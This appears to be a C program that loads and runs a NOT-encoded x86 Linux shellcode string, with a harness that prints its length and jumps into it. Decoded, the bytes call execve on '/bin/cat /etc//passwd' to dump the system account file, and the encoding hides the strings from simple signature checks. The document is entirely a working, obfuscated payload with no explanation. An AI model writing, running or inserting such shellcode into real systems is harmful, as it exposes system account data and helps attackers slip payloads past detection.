#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x31\x52\x68\xd0\x9c\x9e\x8b\xf7\x14\x24\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x8c\x8c\x88\x9b\xf7\x14\x24\x68\xd0\xd0\x8f\x9e\xf7\x14\x24\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80\x31\xdb\x31\xc9\xf7\xe1\xe8\xc4\xff\xff\xff";
int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

